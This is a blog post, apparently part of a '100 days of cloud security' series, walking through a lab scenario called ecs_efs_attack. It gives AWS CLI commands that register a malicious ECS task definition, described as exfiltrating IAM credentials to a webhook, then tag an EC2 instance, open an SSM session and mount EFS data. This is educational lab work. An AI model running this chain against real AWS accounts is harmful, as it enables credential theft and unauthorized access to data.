---
title: '100 Days of Cloud Security - Day 28: Attack — `ecs_efs_attack` - Part 2'
date: '2025-12-07'
author: 'Venkata Pathuri'
excerpt: 'Day 28 of my cloud security journey - Attack — `ecs_efs_attack` - Part 2'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 28: Attack — `ecs_efs_attack` - Part 2

## Overview
Today, we delve deeper into the `ecs_efs_attack` scenario, building upon the foundational concepts we explored in Day 27. This hands-on exploration will enhance your understanding of how misconfigurations within AWS services can lead to privilege escalation and unauthorized access. By deploying a malicious task definition to exploit these vulnerabilities, you'll gain practical experience in both offensive and defensive cloud security techniques.

## Learning Objectives
In this session, you'll master the process of exploiting misconfigured IAM roles and ECS task definitions to access sensitive data stored in an Elastic File System (EFS). By the end of the day, you'll be equipped to:
- Register and deploy a malicious ECS task definition.
- Update an ECS service to use this malicious task.
- Verify the credentials obtained through the attack.
- Establish a session on an EC2 instance with restricted access and mount an EFS to retrieve data.

## Deep Dive
### Understanding the Scenario
In this attack scenario, we leverage misconfigured IAM roles and ECS task definitions to escalate privileges. The primary focus is on how an attacker could gain access to EFS data by manipulating ECS services. 

**Key Concepts:**
- **IAM Roles**: IAM roles in AWS provide temporary security credentials to applications running on EC2 instances, which can be exploited if misconfigured.
- **ECS Task Definitions**: These define how Docker containers should run on ECS, including the permissions they have through associated IAM roles.

### Step-by-Step Breakdown

1. **Register Malicious Task Definition**: The first step involves registering a task definition that will allow access to the instance role credentials. The command below uses a JSON file containing your malicious command:
   ```bash
   aws ecs register-task-definition --cli-input-json file://newtask_template.json --profile cg
   ```
   This command registers a new task definition that will call a webhook to exfiltrate IAM credentials.

2. **Update Service with Malicious Task**: Next, you update the ECS service to use the malicious task definition:
   ```bash
   aws ecs update-service --cluster cg-cluster-cgidhosp5cuypf --service cg-webapp-cgidhosp5cuypf --task-definition webapp:2
   ```
   This change allows the ECS service to run the new task definition, which will execute our malicious commands.

3. **Verify ECS Role Credentials**: After deploying the malicious task, you need to confirm that you've successfully obtained ECS role credentials:
   ```bash
   aws sts get-caller-identity --profile cg-ecs
   ```
   If successful, you will see the ARN associated with the assumed role.

4. **Identify EFS Admin Instance**: In this scenario, we target the EC2 instance responsible for managing EFS. We look for specific tags that grant us permission to start a session.

5. **Tag EC2 Instance**: If the instance is not tagged correctly, you can add the necessary tags to gain session access:
   ```bash
   aws ec2 create-tags --resource i-0b39ca73c4a89a96f --tags Key=StartSession,Value=true --profile cg-ecs --region us-east-1
   ```

6. **Start SSM Session**: With the correct tags in place, initiate a session on the EFS admin instance:
   ```bash
   aws ssm start-session --target i-0b39ca73c4a89a96f --profile cg-ecs
   ```
   This command allows you to interact with the instance directly.

7. **Scan Network and Mount EFS**: By using tools like Nmap, you can discover open ports on the target instance. If port 2049 is open, you can mount the EFS:
   ```bash
   cd /mnt
   sudo mkdir efs
   sudo mount -t nfs -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport 10.10.10.184:/ efs
   ```
   This allows access to the EFS data directly.

### Visualizing the Process
As you execute these commands, you'll observe various outputs confirming each step's success, such as updates to the ECS service and successful SSM sessions. Screenshots of the AWS Management Console will typically show the task definitions and service updates, providing visual confirmation of your actions.

## Hands-On Practice
To reinforce your learning, follow these commands in your AWS environment:
- Replace any placeholder credentials denoted as `EXAMPLE` with your actual credentials (e.g., `AKIAIOSFODNN7EXAMPLE  # Example credential - replace with yours` for access keys).
- Utilize the AWS CLI with the `--profile` flag to ensure you're working within the correct context.

### Common Troubleshooting Tips
- Ensure that the IAM roles are correctly configured with the necessary permissions.
- Verify that the EC2 instance is properly tagged to allow session initiation.
- If mounting the EFS fails, check the network configurations and security group settings to ensure that the ports are open.

## Key Takeaways
By executing the steps outlined, you have learned how attackers exploit misconfigured IAM roles and ECS task definitions to gain unauthorized access to sensitive data. This exercise emphasizes the importance of rigorous security practices, including proper role assignment and tagging of resources in AWS.

## Real-World Applications
Understanding these attack vectors is crucial for cloud security professionals. Organizations must regularly audit IAM roles, ECS configurations, and network settings to prevent similar exploits. Implementing least privilege principles and monitoring for unusual activity can significantly enhance security posture in cloud environments.

---
**Journey Progress:** 28/100 Days Complete 🚀